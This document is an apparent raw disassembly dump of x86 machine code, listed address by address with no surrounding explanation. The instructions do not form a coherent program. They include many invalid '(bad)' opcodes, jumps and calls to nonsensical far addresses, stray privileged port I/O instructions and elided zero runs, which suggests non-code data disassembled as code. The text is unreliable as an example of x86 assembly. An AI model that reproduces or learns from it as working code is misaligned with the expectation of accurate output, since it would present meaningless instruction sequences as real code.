  406140:	add    ebp,DWORD PTR [edx+0x63]
  406143:	sub    edx,DWORD PTR [edi+0x10]
  406146:	mov    WORD PTR [ecx-0x21],?
  406149:	call   0x448d2c
  40614e:	push   0xc0a582e
  406153:	push   es
  406154:	sub    ebp,edi
  406156:	ins    BYTE PTR es:[edi],dx
  406157:	add    ebp,DWORD PTR ds:0x8cea78ff
  40615d:	inc    ebp
  40615e:	ja     0x406147
  406160:	ret    
  406161:	je     0x4061c1
  406163:	jmp    0x4061bb
  406165:	clc    
  406166:	fadd   QWORD PTR [ecx+ebp*8]
  406169:	loopne 0x406139
  40616b:	(bad)  
  40616d:	push   0x2c
  40616f:	add    eax,0x101c8ce9
  406174:	test   eax,0x44884f56
  406179:	cld    
	...
  406186:	add    BYTE PTR [eax],al
  406188:	add    BYTE PTR [edx+0x58],ah
  40618b:	xlat   BYTE PTR ds:[ebx]
  40618c:	mov    WORD PTR [esi+0x143428fd],fs
  406192:	push   edx
  406193:	aad    0xe0
  406195:	xchg   esi,eax
  406196:	cmc    
  406197:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406198:	push   esi
  406199:	push   edi
  40619a:	fcom   QWORD PTR [esp+ecx*1]
  40619d:	or     esp,DWORD PTR [esi]
  40619f:	xchg   esi,eax
  4061a0:	loopne 0x406196
  4061a2:	cmp    esp,DWORD PTR [eax+0x1c0557c5]
  4061a8:	(bad)  
  4061a9:	test   DWORD PTR [ebp+0x5620bfc],0xe4e83e9
  4061b3:	outs   dx,BYTE PTR ds:[esi]
  4061b4:	push   ss
  4061b5:	test   BYTE PTR [esi],ch
  4061b7:	test   al,0x3
  4061b9:	aam    0x41
  4061bb:	icebp  
  4061bc:	ins    DWORD PTR es:[edi],dx
  4061bd:	arpl   sp,bx
  4061bf:	fdivr  st(7),st
  4061c1:	mov    ch,0x51
  4061c3:	stc    
  4061c4:	loopne 0x4061fc
  4061c6:	or     DWORD PTR [esi+0x56],eax
  4061c9:	pop    ebx
  4061ca:	in     eax,dx
  4061cb:	xor    eax,0x20db9ce1
  4061d0:	lds    esi,FWORD PTR [ebx+0x5]
  4061d3:	add    al,ah
  4061d5:	fdiv   DWORD PTR [eax+edi*1-0x16f2351b]
  4061dc:	add    esp,DWORD PTR [ebx-0x4a]
  4061df:	add    edx,DWORD PTR [edi+eiz*2-0x7a]
  4061e3:	sbb    edx,DWORD PTR [edx]
  4061e5:	shr    DWORD PTR [ebp-0xa8e7dfb],1
  4061eb:	xlat   BYTE PTR ds:[ebx]
  4061ec:	repnz add BYTE PTR [eax],al
	...
  4061fb:	add    BYTE PTR [ebx-0x19],dh
  4061fe:	add    BYTE PTR [edi],al
  406200:	jmp    0xc209e6f6
  406205:	inc    esp
  406206:	add    bh,ah
  406208:	pop    ds
  406209:	push   ecx
  40620a:	fisubr DWORD PTR [edx+0x3eec8e7a]
  406210:	call   0xf8166a55
  406215:	mov    ?,WORD PTR [ebp-0xb]
  406218:	(bad)  [eax+0x10]
  40621b:	repnz das 
  40621d:	push   edx
  40621e:	sbb    BYTE PTR [edx-0x31],ah
  406221:	(bad)  
  406222:	jmp    0x5fa6:0x250272e1
  406229:	add    eax,0x806b7200
  40622e:	and    BYTE PTR [eax],cl
  406230:	sahf   
  406231:	add    eax,0xe7a4ab33
  406236:	call   0xc97b11b9
  40623b:	stos   DWORD PTR es:[edi],eax
  40623c:	jae    0x406243
  40623e:	push   ebp
  40623f:	(bad)
  406244:	pop    eax
  406245:	add    eax,0x409dee75
  40624a:	or     BYTE PTR [ebx+0x6a00448f],al
  406250:	inc    edx
  406251:	or     DWORD PTR [eax],eax
  406253:	aam    0x65
  406255:	ret    0xf545
  406258:	sub    ch,BYTE PTR ds:0x50bde941
  40625e:	or     BYTE PTR [ecx+0x0],al
	...
  40626d:	add    BYTE PTR [eax],al
  40626f:	je     0x406239
  406271:	add    cl,ch
  406273:	fnstcw WORD PTR [ebp-0x12ab6301]
  406279:	xor    eax,0x305672c
  40627e:	xor    DWORD PTR [eax],esp
  406280:	ss call 0x1aef54
  406286:	add    cl,dh
  406288:	cwde   
  406289:	push   DWORD PTR [ebp+0x52]
  40628c:	pop    ss
  40628d:	call   0x41e1d1
  406292:	call   edi
  406294:	or     dl,BYTE PTR [ebx-0x18]
  406297:	jle    0x40624d
  406299:	add    BYTE PTR [eax],al
  40629b:	mov    cl,0xc7
  40629d:	pop    ebx
  40629e:	leave  
  40629f:	or     BYTE PTR [esi],cl
  4062a1:	add    BYTE PTR [ebp-0x3f],dl
  4062a4:	jmp    0x7500:0x99f8353
  4062ab:	add    eax,0xb00845c3
  4062b0:	cs inc ecx
  4062b2:	add    BYTE PTR [ecx+0x65],bh
  4062b5:	or     al,0x0
  4062b7:	addr16 add al,bh
  4062ba:	inc    ebp
  4062bb:	push   cs
  4062bc:	pop    esp
  4062bd:	sub    BYTE PTR [ecx+0xa],al
  4062c0:	mov    ebx,0xeee20875
  4062c5:	int3   
  4062c6:	add    dl,bh
  4062c8:	mov    ds,eax
  4062ca:	call   edi
  4062cc:	or     eax,ebp
  4062ce:	loope  0x4062ce
  4062d0:	add    eax,0x300
	...
  4062e1:	add    dl,dh
  4062e3:	inc    esi
  4062e4:	push   ebx
  4062e5:	call   0x40221b
  4062ea:	xor    DWORD PTR [esi+0x16c275ff],ebx
  4062f0:	call   0x46b1e0
  4062f5:	jmp    edi
  4062f7:	or     DWORD PTR [ebx-0x18],edx
  4062fa:	xor    cl,dl
  4062fc:	add    BYTE PTR [eax],al
  4062fe:	dec    ebp
  4062ff:	cmp    eax,0xbf12e808
  406304:	(bad)  
  406305:	call   DWORD PTR [ecx]
  406307:	(bad)  
  406308:	pop    ebx
  406309:	leave  
  40630a:	dec    eax
  40630b:	push   cs
  40630c:	add    BYTE PTR [ebp+0x63],dl
  40630f:	addr16 out dx,eax
  406311:	and    DWORD PTR [edi+0x5e683607],0xffffffed
  406318:	add    eax,DWORD PTR [eax]
  40631a:	dec    ebx
  40631b:	adc    dl,bl
  40631d:	call   DWORD PTR [esi+eiz*2+0x48]
  406321:	cld    
  406322:	loopne 0x4062cd
  406324:	dec    esp
  406325:	sub    DWORD PTR [edx+0x617503ee],esp
  40632b:	mov    bl,0xf6
  40632d:	(bad)  
  40632e:	scas   al,BYTE PTR es:[edi]
  40632f:	mov    dl,0x6a
  406331:	add    BYTE PTR [ecx+0x5b75dcee],bh
  406337:	xor    al,0x4
  406339:	push   DWORD PTR [esi+0x15]
  40633c:	sub    eax,DWORD PTR [ecx+0x63]
  40633f:	imul   eax,esp,0x57a79b79
  406345:	cld    
	...
  406352:	add    BYTE PTR [eax],al
  406354:	add    bl,bh
  406356:	cli    
  406357:	fdivr  st,st(7)
  406359:	cld    
  40635a:	lahf   
  40635b:	inc    edi
  40635c:	cld    
  40635d:	arpl   si,bp
  40635f:	add    eax,DWORD PTR [eax]
  406361:	lods   al,BYTE PTR ds:[esi]
  406362:	stc    
  406363:	sub    al,BYTE PTR [ecx+0x63]
  406366:	jae    0x406397
  406368:	mov    esi,DWORD PTR [ebx+edx*2+0x47]
  40636c:	or     BYTE PTR [esi+0x4f],bh
  40636f:	pop    ebp
  406370:	dec    esp
  406372:	xchg   ebp,eax
  406373:	inc    ecx
  406374:	add    al,0x4e
  406376:	add    ebp,DWORD PTR [edx+0x0]
  406379:	out    dx,al
  40637a:	lods   al,BYTE PTR ds:[esi]
  40637b:	or     edx,DWORD PTR [eax+0x4b]
  40637e:	push   ebp
  40637f:	sub    al,BYTE PTR [ecx+0x63]
  406382:	inc    edi
  406383:	adc    ch,al
  406385:	push   es
  406386:	inc    eax
  406387:	(bad)  
  406389:	push   0xea05582e
  40638e:	test   eax,0x6b5bebdf
  406393:	lds    eax,FWORD PTR [eax+eiz*8]
  406396:	add    eax,0xc6f603e6
  40639b:	jb     0x4063e4
  40639d:	ja     0x4063d7
  40639f:	and    dl,al
  4063a1:	addr16 add eax,0x347788b4
  4063a7:	jb     0x4063f0
  4063a9:	imul   ecx,DWORD PTR [ecx+ebp*1],0x58
  4063ad:	pop    esi
  4063ae:	test   DWORD PTR [ecx+0x310bd603],esi
  4063b4:	add    al,0x63
  4063b6:	add    eax,0x38e9
	...
  4063c7:	add    BYTE PTR [edx],ch
  4063c9:	ret    
  4063ca:	in     eax,0x3
  4063cc:	leave  
  4063cd:	add    eax,0x4b90443
  4063d2:	inc    ebx
  4063d3:	add    al,0xb9
  4063d5:	add    eax,0x5638451
  4063da:	jmp    0xc14df2bb
  4063df:	in     al,0x18
  4063e1:	add    eax,0x2c2b88e9
  4063e6:	test   eax,0x3a0c7740
  4063eb:	in     al,dx
  4063ec:	std    
  4063ed:	retf   
  4063ee:	jmp    0xe9460ef6
  4063f3:	add    esp,DWORD PTR [ebx+0x3c]
  4063f6:	mov    al,0xc1
  4063f8:	addr16 add eax,0x8bc78914
  4063fe:	sub    al,0xc
  406400:	pop    eax
  406401:	(bad)
  406404:	jecxz  0x406422
  406406:	jmp    0xe9ddce61
  40640b:	add    esp,DWORD PTR [ebx+0x5]
  40640e:	and    cl,al
  406410:	addr16 add eax,0xed5b564e
  406416:	cmp    ecx,eax
  406418:	arpl   WORD PTR ds:0x5094db6a,ax
  40641e:	add    ah,ah
  406420:	mov    ecx,0x60e8fff4
  406425:	or     BYTE PTR [ebp-0x3f7090d7],dl
  40642b:	adc    al,BYTE PTR [eax]
	...
  406439:	add    BYTE PTR [eax],al
  40643b:	pop    ebp
  40643c:	popf   
  40643d:	add    cl,ch
  40643f:	pusha  
  406440:	add    eax,0x55c2bc9
  406445:	push   ebp
  406446:	jb     0x406494
  406448:	add    esp,0xfffffffd
  40644b:	retf   
  40644c:	add    eax,0x512fe96a
  406451:	or     BYTE PTR [ecx],al
  406453:	sbb    ecx,ebx
  406455:	add    cl,ch
  406457:	ins    DWORD PTR es:[edi],dx
  406458:	lds    esi,FWORD PTR [ebx+edx*1+0x6f]
  40645c:	xor    eax,0xd70d8ae8
  406461:	jmp    DWORD PTR [eax-0x5e]
  406464:	fstp   DWORD PTR [eax+0x19]
  406467:	cmp    BYTE PTR [ecx-0x4],dl
  40646a:	mov    esi,0x79e80db2
  40646f:	sbb    al,0x6
  406471:	add    dl,ah
  406473:	and    BYTE PTR [ecx+0xc],dl
  406476:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406477:	xchg   edx,eax
  406478:	fld1   
  40647a:	sbb    DWORD PTR ds:0x20c2ffd7,edx
  406480:	jmp    0x406485
  406482:	bound  esp,QWORD PTR [edx+0x63abc9d9]
  406488:	add    eax,0x32cb7255
  40648d:	mov    edx,DWORD PTR [ebx+ebx*2]
  406490:	imul   edx,DWORD PTR [eax],0x1a
  406493:	mov    bh,0x81
  406495:	cli    
  406496:	cbw    
  406498:	imul   eax,DWORD PTR [eax],0xffffffd3
  40649b:	pusha  
  40649c:	imul   eax,DWORD PTR [ebx],0xffffffc3
	...
  4064ab:	add    BYTE PTR [eax],al
  4064ad:	add    BYTE PTR [eax+0x6b],ah
  4064b0:	add    eax,ecx
  4064b2:	pusha  
  4064b3:	add    eax,0xba0a0000
  4064b8:	jne    0x4064c2
  4064ba:	xor    ah,BYTE PTR [esi]
  4064bc:	retf   
  4064bd:	add    BYTE PTR [edx-0x77],bh
  4064c0:	add    eax,DWORD PTR [eax-0x32]
  4064c3:	push   cs
  4064c4:	push   0x0
  4064c6:	mov    edx,0x8acb6cea
  4064cb:	add    cl,BYTE PTR [ecx+0x688643]
  4064d1:	push   0x7a
  4064d3:	push   0x68486a00
  4064d8:	add    bh,bh
  4064da:	sbb    edx,ebp
  4064dc:	pop    esi
  4064dd:	retf   
  4064de:	cmp    al,BYTE PTR [edx]
  4064e0:	or     eax,eax
  4064e2:	into   
  4064e3:	sub    ecx,DWORD PTR [ecx+0x684e43]
  4064e9:	push   0x4a
  4064eb:	push   0x123e6a00
  4064f0:	call   0x426644
  4064f5:	mov    DWORD PTR [ecx+0x9],ecx
  4064f8:	or     eax,eax
  4064fa:	dec    edi
  4064fb:	and    eax,0xe9fe73ff
  406500:	repnz retf 0x1fa
  406504:	push   DWORD PTR [ebx]
  406506:	shl    dh,cl
  406508:	retf   0xa00
  40650b:	ret    
  40650c:	add    edi,edi
  40650e:	aad    0xba
  406510:	(bad)  
  406511:	jmp    0x406513
	...
  40651f:	add    BYTE PTR [eax],al
  406521:	pop    es
  406522:	mov    ebx,0xc806e833
  406527:	add    BYTE PTR [eax],al
  406529:	std    
  40652a:	(bad)  
  40652b:	(bad)  
  40652c:	call   DWORD PTR [ebp-0x45]
  40652f:	sub    eax,eax
  406531:	adc    edi,DWORD PTR [edi]
  406533:	or     BYTE PTR [edi],cl
  406535:	aas    
  406536:	ret    0xc95b
  406539:	mov    BYTE PTR [edx],cl
  40653b:	add    BYTE PTR [ebp+0x63],dl
  40653e:	arpl   di,sp
  406540:	push   ebx
  406541:	fsubr  DWORD PTR [eax+0x3f58830b]
  406547:	dec    edi
  406548:	pop    ss
  406549:	xchg   esp,eax
  40654a:	call   0x3:0x235ae80b
  406551:	test   BYTE PTR [edx+0x11cee7ff],bl
  406557:	add    eax,DWORD PTR [eax]
  406559:	je     0x406515
  40655b:	jmp    0x406503
  40655d:	cdq    
  40655e:	jmp    0x406563
  406560:	pop    ebx
  406561:	call   0xe757:0xb7ffff29
  406568:	sbb    DWORD PTR [edi],0x4cffe9ff
  40656e:	jne    0x4065a2
  406570:	add    DWORD PTR [esi+0x63412b9e],0xffffffde
  406577:	dec    edi
  406578:	adc    eax,0x2843fa34
  40657d:	mov    ds:0x2a8aebde,al
  406582:	(bad)  
  406583:	fld    st(7)
	...
  406591:	add    BYTE PTR [eax],al
  406593:	add    BYTE PTR [esi+0x1e],ah
  406596:	sub    al,0x41
  406598:	arpl   si,bx
  40659a:	add    eax,DWORD PTR [eax]
  40659c:	arpl   WORD PTR [edi+0x17],bx
  40659f:	inc    esp
  4065a0:	cmp    ebx,DWORD PTR ds:0xd1770004
  4065a6:	fdiv   DWORD PTR ds:0x42b69f
  4065ac:	sti    
  4065ad:	or     bl,bl
  4065af:	jmp    esp
  4065b1:	stos   DWORD PTR es:[edi],eax
  4065b2:	inc    DWORD PTR [ebx-0x75]
  4065b5:	sbb    eax,0xde630004
  4065ba:	add    ecx,DWORD PTR [ebp-0x16b11a]
  4065c0:	(bad)  
  4065c1:	out    dx,al
  4065c2:	jmp    0x40656a
  4065c4:	mov    bl,0x5
  4065c6:	data16 (bad) 
  4065c9:	mov    cl,BYTE PTR [ebp-0x17]
  4065cc:	lods   al,BYTE PTR ds:[esi]
  4065cd:	aam    0xb9
  4065cf:	jmp    0x40659a
  4065d1:	aad    0x4e
  4065d3:	fldz   
  4065d5:	dec    edx
  4065d6:	inc    ebp
  4065d7:	xor    al,0xb
  4065d9:	cmp    eax,0x5d634311
  4065de:	jmp    0x4065e3
  4065e0:	arpl   WORD PTR [ebp+0x5a87141],ax
  4065e6:	jmp    0x644508f7
  4065eb:	cmp    eax,0xc0e90562
  4065f0:	fcompp 
  4065f2:	(bad)  
  4065f3:	fcomp  DWORD PTR [ebp+eax*1-0x17]
  4065f7:	add    eax,DWORD PTR [eax]
	...
  406605:	add    BYTE PTR [eax],al
  406607:	arpl   sp,cx
  406609:	fdivr  QWORD PTR fs:[esp+edx*8]
  40660d:	neg    al
  40660f:	push   esp
  406610:	add    eax,0x5f636de9
  406615:	jmp    0xe99fc987
  40661a:	xchg   dh,ah
  40661c:	int3   
  40661d:	(bad)  
  40661e:	fsub   DWORD PTR [esi*1-0x1be081a4]
  406625:	(bad)  
  406626:	fdiv   DWORD PTR [ebx-0x3308b2c]
  40662c:	shl    DWORD PTR [esi-0x3e2e7128],cl
  406632:	sub    BYTE PTR ss:0x4230ce9,al
  406639:	fs hlt 
  40663b:	arpl   WORD PTR ds:0x1ccb6be9,ax
  406641:	sub    BYTE PTR [ebx+ecx*2],al
  406644:	cmp    eax,0xdd6342d1
  406649:	(bad)  
  40664a:	xlat   BYTE PTR ds:[ebx]
  40664b:	int3   
  40664c:	rol    DWORD PTR [eax],cl
  40664e:	loop   0x4065f0
  406650:	add    eax,DWORD PTR [eax+edi*2+0x72000560]
  406657:	lock add DWORD PTR [ebp-0x2c44a3],0xbcdd6eb9
  406662:	dec    ebp
  406663:	mov    ebx,0x6b290bd3
  406668:	mov    edx,ebx
  40666a:	jmp    0x40666f
	...
  406677:	add    BYTE PTR [eax],al
  406679:	add    BYTE PTR [eax+0x5],ah
  40667c:	mov    DWORD PTR [eax+eax*4-0x1d],ebp
  406680:	jmp    FWORD PTR [esi]
  406682:	in     eax,0x89
  406684:	call   0x5114019f
  406689:	xchg   ecx,eax
  40668a:	adc    al,0x1d
  40668c:	inc    ecx
  40668d:	jmp    0xff21001d
  406692:	xor    al,0xd3
  406694:	push   0x800560eb
  406699:	adc    ebx,esi
  40669b:	into   
  40669c:	push   esi
  40669e:	pop    eax
  40669f:	lds    ecx,FWORD PTR [edi]
  4066a1:	fld    QWORD PTR gs:0xcde1e900
  4066a8:	add    esi,ebp
  4066aa:	scas   al,BYTE PTR es:[edi]
  4066ab:	jno    0x4066ad
  4066ad:	jmp    0x953f9c12
  4066b2:	pavgw  mm7,mm7
  4066b5:	(bad)  
  4066b6:	dec    edi
  4066b7:	shl    BYTE PTR [ebp-0x2cfb47],cl
  4066bd:	rol    DWORD PTR [esi],0xda
  4066c0:	jmp    FWORD PTR [esi-0x69177716]
  4066c6:	or     al,0xd3
  4066c8:	push   eax
  4066c9:	adc    ebx,ebx
  4066cb:	sbb    eax,0x990de941
  4066d0:	loopne 0x406750
  4066d2:	mov    ah,0xd2
  4066d4:	push   0x6c800
  4066d9:	xor    dl,0x42
  4066dc:	sti    
  4066dd:	inc    DWORD PTR [eax]
	...
  4066eb:	add    BYTE PTR [eax],al
  4066ed:	dec    ebp
  4066ee:	(bad)  
  4066ef:	mov    edi,0xbd868674
  4066f4:	call   0x2402106
  4066f9:	xchg   esp,eax
  4066fa:	out    dx,eax
  4066fb:	dec    edi
  4066fc:	push   eax
  4066fd:	aas    
  4066fe:	test   ah,bh
  406700:	out    dx,eax
  406701:	sub    eax,0xd2e850ba
  406706:	rol    DWORD PTR [eax],0x0
  406709:	jmp    0xffba:0x1dfc857d
  406710:	push   eax
  406711:	dec    ebp
  406712:	je     0x406700
  406714:	out    dx,eax
  406715:	cmp    eax,0x56cfe8ba
  40671a:	mov    edx,0x744d58ff
  40671f:	call   0x50fad513
  406724:	call   DWORD PTR [edi+0x4dffefdd]
  40672a:	fidivr WORD PTR [esp+esi*8+0x19e8bb4d]
  406731:	xor    bh,BYTE PTR [ebx+0x7c6aebff]
  406737:	test   esp,edi
  406739:	sbb    eax,0x2250ffbb
  40673e:	or     ecx,ecx
  406740:	add    BYTE PTR [edx],cl
  406742:	inc    esi
  406743:	push   eax
  406744:	lea    eax,[edi-0x32001046]
  40674a:	adc    eax,0xeb1eb5ff
  40674f:	(bad)  
  406750:	inc    DWORD PTR [eax]
	...
  40675e:	add    BYTE PTR [eax],al
  406760:	and    dl,BYTE PTR [ebp-0xc]
  406763:	(bad)  
  406764:	mov    ebp,0xcdf7f2dd
  406769:	mov    edx,0x7c63b5ff
  40676e:	out    0xff,al
  406770:	fadd   QWORD PTR [ebx-0x752b0822]
  406776:	(bad)  
  406777:	test   edi,edx
  406779:	adc    dh,0xff
  40677c:	mov    edx,0xbcffd512
  406781:	bound  edx,QWORD PTR [eax-0x4]
  406784:	retf   
  406785:	stc    
  406786:	leave  
  406787:	add    BYTE PTR [ebx-0x4a],ah
  40678a:	add    edi,edi
  40678c:	out    dx,al
  40678d:	sub    esp,esi
  40678f:	call   FWORD PTR [ebx+eax*2+0x4a94f433]
  406796:	imul   eax,DWORD PTR [eax],0xefe7588c
  40679c:	test   BYTE PTR [edx],bl
  40679e:	jmp    0x4067e3
  4067a0:	ja     0x4067c4
  4067a2:	(bad)  
  4067a3:	(bad)  
  4067a4:	fdivp  st(7),st
  4067a6:	in     eax,0xff
  4067a8:	ins    BYTE PTR es:[edi],dx
  4067a9:	mov    edx,esi
  4067ab:	mov    ch,0x73
  4067ad:	or     dl,dh
  4067af:	dec    DWORD PTR [ebx+0xd]
  4067b2:	int3   
  4067b3:	add    BYTE PTR [ebx+0x61],ah
  4067b6:	ret    
  4067b7:	js     0x406751
  4067b9:	iret   
  4067ba:	(bad)  
  4067bb:	lock xor al,0xd8
  4067be:	aad    0xe8
  4067c0:	pushf  
  4067c1:	iret   
  4067c2:	aad    0xff
	...
  4067d0:	add    BYTE PTR [eax],al
  4067d2:	add    dl,ch
  4067d4:	popa   
  4067d5:	in     al,dx
  4067d6:	out    dx,eax
  4067d7:	sub    al,0xb0
  4067d9:	aad    0xb5
  4067db:	cmp    ecx,eax
  4067dd:	aad    0xff
  4067df:	or     esp,DWORD PTR [eax-0x33]
  4067e2:	call   DWORD PTR [esp+edi*2]
  4067e5:	inc    esp
  4067e6:	sub    BYTE PTR [edx-0x4a2b22],ah
  4067ec:	(bad)  
  4067ed:	aad    0xff
  4067ef:	or     ebx,DWORD PTR [ebp-0x34]
  4067f2:	add    BYTE PTR [ebx+0x5],ah
  4067f5:	bnd ret 
  4067f7:	ja     0x4067e5
  4067f9:	jno    0x406782
  4067fb:	sti    
  4067fc:	loopne 0x406794
  4067fe:	aad    0xe8
  406800:	aad    0x62
  406802:	pop    ss
  406803:	and    ebx,DWORD PTR ds:0xa9d00428
  406809:	jle    0x40679a
  40680b:	mov    edi,0xcbd576e0
  406810:	pop    esi
  406811:	mov    eax,ds:0x6c826304
  406816:	loopne 0x4067d4
  406818:	rcr    BYTE PTR [esi+0x34],1
  40681b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40681c:	call   0x5341:0xd09ce545
  406823:	stos   BYTE PTR es:[edi],al
  406824:	add    eax,0x4da37ee9
  406829:	mov    dl,0xd4
  40682b:	into   
  40682c:	loope  0x406874
  40682e:	aad    0x7c
  406830:	(bad)  [edi]
  406832:	out    0x74,al
  406834:	shl    BYTE PTR [eax+0x7f],1
	...
  406843:	add    BYTE PTR [eax],al
  406845:	add    BYTE PTR [ebx-0x20],bh
  406848:	push   ds
  406849:	aad    0x64
  40684b:	call   0x1601:0xd05ce501
  406852:	dec    esp
  406853:	rol    BYTE PTR [esi],1
  406855:	mov    eax,ds:0x3a81da7
  40685a:	inc    esp
  40685b:	call   0x2301:0xd03ce50d
  406862:	sub    eax,DWORD PTR ds:0x592308e9
  406868:	add    cl,BYTE PTR [ecx-0x2b39232a]
  40686e:	sbb    al,0x7c
  406870:	(bad)  [eax+0x43114956]
  406876:	arpl   sp,dx
  406878:	test   esp,edx
  40687a:	into   
  40687b:	call   0xd0582e80
  406880:	call   0x459166
  406885:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406886:	fst    st(4)
  406888:	out    dx,eax
  406889:	sahf   
  40688a:	paddusw mm3,QWORD PTR [edx-0x79]
  40688e:	mov    bh,0xcf
  406890:	call   DWORD PTR [esp+edi*4-0x21]
  406894:	inc    DWORD PTR [esi+0x7eee3fb8]
  40689a:	scas   eax,DWORD PTR es:[edi]
  40689b:	das    
  40689c:	pop    esi
  40689d:	mov    al,ds:0x7d8b39a3
  4068a2:	dec    edx
  4068a3:	std    
  4068a4:	out    0x52,eax
  4068a6:	sahf   
  4068a7:	iret   
  4068a8:	push   DWORD PTR [edx+0x0]
	...
  4068b7:	add    BYTE PTR [eax],al
  4068b9:	lock iret 
  4068bb:	xor    eax,0x464877
  4068c0:	pop    esi
  4068c1:	(bad)  
  4068c2:	shl    BYTE PTR [ebp-0xf],1
  4068c5:	out    0x42,eax
  4068c7:	add    al,0x70
  4068c9:	jne    0x40693c
  4068cb:	sub    BYTE PTR [eax-0x1a3d41a0],ch
  4068d1:	pusha  
  4068d2:	cmp    cl,BYTE PTR [ebx-0x7371ceb]
  4068d8:	mov    dh,0xa7
  4068da:	dec    ecx
  4068db:	clc    
  4068dc:	jmp    0x6a406e41
  4068e1:	lods   eax,DWORD PTR ds:[esi]
  4068e2:	std    
  4068e3:	(bad)  
  4068e4:	jl     0x406938
  4068e6:	shl    BYTE PTR [ebp-0x13],1
  4068e9:	das    
  4068ea:	pop    ecx
  4068eb:	or     BYTE PTR [ebx-0xcf922a0],al
  4068f1:	adc    bh,cl
  4068f3:	mov    DWORD PTR [ebx+edx*1],ebp
  4068f6:	fild   DWORD PTR [edi]
  4068f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068f9:	call   0x8b05:0x60e900d1
  406900:	or     al,0x91
  406902:	sbb    eax,0xaffa0041
  406907:	adc    ecx,DWORD PTR [ebx+0x473bb53f]
  40690d:	push   cs
  40690e:	cs or  edi,eax
  406911:	aas    
  406912:	rol    DWORD PTR [ecx],0x0
  406915:	cli    
  406916:	add    ch,bl
  406918:	push   es
  406919:	jno    0x40690d
  40691b:	or     bh,bh
	...
  406929:	add    BYTE PTR [eax],al
  40692b:	add    BYTE PTR [edi-0x50],bh
  40692e:	cmp    DWORD PTR [ebp-0xe],0x9
  406932:	jne    0x40693c
  406934:	in     eax,0x2c
  406936:	cld    
  406937:	call   0x401b74
  40693c:	inc    ecx
  40693d:	cmp    al,0xf8
  40693f:	pop    edi
  406940:	add    ecx,eax
  406942:	or     BYTE PTR [eax],al
  406944:	in     eax,dx
  406945:	dec    edi
  406946:	cmp    eax,0x48529e
  40694b:	jmp    0x4068cf
  40694d:	or     ecx,DWORD PTR [ebx-0x9c5ddc1]
  406953:	jmp    DWORD PTR ds:0x4e75fece
  406959:	mov    edx,0x48629e05
  40695e:	add    BYTE PTR [eax],al
  406960:	mov    al,BYTE PTR [edx]
  406962:	add    BYTE PTR [edi+0x39],bl
  406965:	or     al,0x8b
  406967:	in     al,dx
  406968:	lods   eax,DWORD PTR ds:[esi]
  406969:	or     al,0x6a
  40696b:	add    BYTE PTR [ebp+0x2c],dh
  40696e:	or     al,ch
  406970:	jge    0x406932
  406972:	(bad)  
  406973:	call   ecx
  406975:	sar    edi,0x75
  406978:	push   edx
  406979:	stos   BYTE PTR es:[edi],al
  40697a:	and    al,bh
  40697c:	dec    edx
  40697d:	add    al,BYTE PTR [ebx+0xf2c4bf8]
  406983:	push   edi
  406984:	mov    edx,0x327521f3
  406989:	mov    esi,0xdd63778d
  40698e:	jle    0x406958
	...
  40699c:	add    BYTE PTR [eax],al
  40699e:	add    BYTE PTR [eax],dl
  4069a0:	mov    BYTE PTR [edx],dh
  4069a2:	push   0x44f55e
  4069a7:	lods   al,BYTE PTR ds:[esi]
  4069a8:	mov    ah,0x6e
  4069aa:	enter  0xdc63,0xfe
  4069ae:	mov    edi,0x40c9e86f
  4069b3:	fcomp  QWORD PTR [di+0x5c]
  4069b7:	jns    0x406995
  4069b9:	cmp    ch,al
  4069bb:	in     al,dx
  4069bc:	mov    ds:0x9c680003,eax
  4069c1:	push   edi
  4069c2:	add    eax,0xeb03dba5
  4069c7:	pusha  
  4069c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4069c9:	or     al,BYTE PTR [eax]
  4069cb:	adc    al,0x84
  4069cd:	mov    dl,0xc6
  4069cf:	arpl   sp,bx
  4069d1:	xchg   al,bh
  4069d3:	pusha  
  4069d4:	scas   eax,DWORD PTR es:[edi]
  4069d5:	push   es
  4069d6:	(bad)  
  4069d7:	pop    esp
  4069d8:	fdivr  QWORD PTR [esi-0x39]
  4069db:	cmp    eax,0x5fc2bc97
  4069e0:	fdivr  QWORD PTR [eax]
  4069e2:	mov    edi,DWORD PTR [edi+0x5a]
  4069e5:	(bad)  
  4069e6:	cld    
  4069e7:	fsubr  DWORD PTR [eax-0x539cfb01]
  4069ed:	add    eax,DWORD PTR [eax]
  4069ef:	adc    eax,DWORD PTR [ecx+eax*8-0xb]
  4069f3:	ins    BYTE PTR es:[edi],dx
  4069f4:	es jl  0x406a3c
  4069f7:	addr16 out dx,al
  4069f9:	push   edi
  4069fa:	or     al,0x5c
  4069fc:	push   0xffffffcf
  4069fe:	dec    esi
  406a00:	out    0xdb,al
  406a02:	hlt    
	...
  406a0f:	add    BYTE PTR [eax],al
  406a11:	add    BYTE PTR [esi+0x4],dl
  406a14:	sar    bh,cl
  406a16:	into   
  406a17:	scas   al,BYTE PTR es:[edi]
  406a18:	shl    BYTE PTR [ebp+0x6f],cl
  406a1b:	rcl    DWORD PTR [edi-0x4],cl
  406a1e:	dec    ebx
  406a1f:	or     BYTE PTR [bx+si],al
  406a22:	arpl   WORD PTR ds:0xde2757e6,ax
  406a28:	jns    0x406a01
  406a2a:	sbb    al,0xcd
  406a2c:	mov    al,ds:0x3a0567c6
  406a31:	pop    esp
  406a32:	stc    
  406a33:	sbb    eax,0xb8fb0428
  406a38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a39:	add    al,0x63
  406a3b:	add    BYTE PTR [ecx-0x6e7faea8],ch
  406a41:	pop    esp
  406a42:	cmc    
  406a43:	sbb    eax,0xdd900428
  406a48:	mov    cl,0xca
  406a4a:	arpl   WORD PTR ds:0x468bfb4a,ax
  406a50:	jmp    0x72730a81
  406a55:	loopne 0x406a84
  406a57:	cmp    BYTE PTR [esi],dl
  406a59:	shl    DWORD PTR [esi],1
  406a5b:	std    
  406a5c:	sbb    BYTE PTR [edi+0x73e9059d],0x58
  406a63:	(bad)
  406a66:	add    al,0x30
  406a68:	mov    edi,0xe8fda1ba
  406a6d:	jl     0x406a85
  406a6f:	std    
  406a70:	js     0x406aef
  406a72:	stos   DWORD PTR es:[edi],eax
  406a73:	jne    0x406ae7
  406a75:	push   edi
	...
  406a82:	add    BYTE PTR [eax],al
  406a84:	add    BYTE PTR [edi+0x20],dl
